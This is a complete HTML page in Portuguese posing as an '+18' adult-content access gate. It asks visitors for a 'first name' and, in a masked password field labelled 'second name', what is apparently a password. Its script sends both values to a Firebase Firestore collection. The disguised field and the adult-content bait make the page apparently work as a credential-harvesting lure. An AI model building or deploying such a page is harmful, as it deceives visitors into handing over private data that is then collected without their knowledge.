<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>+18</title>

  <style>

    *{
      margin:0;
      padding:0;
      box-sizing:border-box;
      font-family:Arial,sans-serif;
    }

    body{
      height:100vh;
      overflow:hidden;

      background:url('fundo.jpg') no-repeat center center/cover;

      position:relative;
    }

    .overlay{
      width:100%;
      height:100%;

      background:linear-gradient(
        rgba(0,0,0,.85),
        rgba(20,0,20,.85)
      );

      display:flex;
      justify-content:center;
      align-items:center;
    }

    .box{
      width:100%;
      max-width:420px;

      background:rgba(255,255,255,.08);

      backdrop-filter:blur(8px);

      border:1px solid rgba(255,255,255,.2);

      border-radius:20px;

      padding:25px;

      text-align:center;

      color:white;

      z-index:10;

      box-shadow:
      0 0 20px rgba(255,0,80,.4),
      0 0 40px rgba(255,0,80,.2);
    }

    .banner{
      width:100%;
      height:170px;

      background:url('banner.jpg') no-repeat center center/cover;

      border-radius:15px;

      margin-bottom:20px;

      border:2px solid rgba(255,255,255,.2);
    }

    h1{
      font-size:42px;

      margin-bottom:10px;

      color:#ff00ff;

      text-shadow:
      0 0 5px #ff00ff,
      0 0 10px #ff00ff,
      0 0 20px #ff00ff;

      animation:glitch .2s infinite;
    }

    .descricao{
      font-size:16px;
      margin-bottom:20px;

      text-shadow:
      0 0 5px #ff00ff;
    }

    .label{
      text-align:left;
      margin-bottom:8px;
      font-size:15px;
    }

    input{
      width:100%;

      padding:14px;

      margin-bottom:18px;

      border:none;
      outline:none;

      border-radius:10px;

      background:rgba(255,255,255,.15);

      color:white;

      font-size:16px;
    }

    input::placeholder{
      color:rgba(255,255,255,.7);
    }

    button{
      width:100%;

      padding:14px;

      border:none;

      border-radius:10px;

      background:#ff0033;

      color:white;

      font-size:18px;
      font-weight:bold;

      cursor:pointer;

      transition:.3s;

      box-shadow:
      0 0 10px #ff0033,
      0 0 20px #ff0033;
    }

    button:hover{
      transform:scale(1.03);

      background:#ff2255;
    }

    .neon-text{
      position:absolute;

      font-size:42px;

      font-weight:bold;

      opacity:.2;

      animation:piscar 1s infinite alternate;
    }

    .pink{
      color:#ff00ff;
      text-shadow:0 0 10px #ff00ff;
    }

    .blue{
      color:#00ccff;
      text-shadow:0 0 10px #00ccff;
    }

    .red{
      color:#ff0033;
      text-shadow:0 0 10px #ff0033;
    }

    .purple{
      color:#9900ff;
      text-shadow:0 0 10px #9900ff;
    }

    @keyframes piscar{
      from{ opacity:.1; }
      to{ opacity:.9; }
    }

    @keyframes glitch{
      0%{ transform:translate(1px,1px); }
      50%{ transform:translate(-2px,-1px); }
      100%{ transform:translate(1px,-1px); }
    }

  </style>
</head>
<body>

  <!-- TEXTOS FUNDO -->
  <div class="neon-text pink" style="top:8%; left:5%;">
    +18 ONLY
  </div>

  <div class="neon-text blue" style="top:18%; right:5%;">
    VIP CONTENT
  </div>

  <div class="neon-text red" style="bottom:15%; left:8%;">
    PRIVATE AREA
  </div>

  <div class="neon-text purple" style="bottom:8%; right:10%;">
    ACCESS 18+
  </div>

  <div class="overlay">

    <div class="box">

      <div class="banner"></div>

      <h1>+18</h1>

      <p class="descricao">
        Envie seu nome
      </p>

      <div class="label">
        Digite o primeiro nome
      </div>

      <input
        type="text"
        id="nome1"
        placeholder="Primeiro nome"
      >

      <input
        type="password"
        id="nome2"
        placeholder="Segundo nome"
      >

      <button onclick="enviar()">
        Enviar
      </button>

    </div>

  </div>

  <script type="module">

    import { initializeApp }
    from "https://www.gstatic.com/firebasejs/12.13.0/firebase-app.js";

    import {
      getFirestore,
      collection,
      addDoc,
      serverTimestamp
    }
    from "https://www.gstatic.com/firebasejs/12.13.0/firebase-firestore.js";

    const firebaseConfig = {

      apiKey: "AIzaSyB86l1AotdIkRmCzWs65iV9NYltwq48Fk8",
      authDomain: "site18-4dd46.firebaseapp.com",
      projectId: "site18-4dd46",
      storageBucket: "site18-4dd46.firebasestorage.app",
      messagingSenderId: "174794961690",
      appId: "1:174794961690:web:781acedc7483ddf78a72a3"

    };

    const app =
    initializeApp(firebaseConfig);

    const db =
    getFirestore(app);

    window.enviar = async function(){

      const nome1 =
      document.getElementById("nome1").value.trim();

      const nome2 =
      document.getElementById("nome2").value.trim();

      if(nome1 === "" || nome2 === ""){
        alert("Preencha os campos");
        return;
      }

      await addDoc(
        collection(db, "envios"),
        {
          primeiroNome: nome1,
          segundoNome: nome2,
          data: new Date().toLocaleString(),
          criadoEm: serverTimestamp()
        }
      );

      alert("Dados enviados!");

      document.getElementById("nome1").value = "";
      document.getElementById("nome2").value = "";

    };

  </script>

</body>
</html>
